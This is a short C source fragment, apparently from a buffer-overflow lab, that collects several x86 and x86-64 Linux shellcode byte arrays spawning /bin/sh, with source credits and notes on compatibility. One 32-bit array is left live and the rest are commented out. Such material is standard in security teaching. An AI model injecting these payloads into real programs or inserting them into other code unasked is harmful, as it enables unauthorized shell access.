
/* Old Linux shellcode that is not correct anymore on Ubuntu 12.04
static char shellcode[] =
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh"; 
*/

/* the following shellcode[] is copied from shell-storm.org website at:
http://shell-storm.org/shellcode/files/shellcode-806.php

This is the shellcode for x86 64-bit Linux machine. It has 27 bytes.
const char shellcode[] = 
"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
*/

/* the following shellcode[] is copied from:
https://www.exploit-db.com/exploits/47008
The shell code has 22 bytes.
unsigned char shellcode[]= \
    "\x48\x31\xf6\x56\x48\xbf"
		  "\x2f\x62\x69\x6e\x2f"
		  "\x2f\x73\x68\x57\x54"
		  "\x5f\xb0\x3b\x99\x0f\x05";
*/

/* the follow shell is copied from https://gist.github.com/securitytube/5318838; but gcc needs -m32 option for 32-bit mode*/
unsigned char shellcode[] = 
"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; 

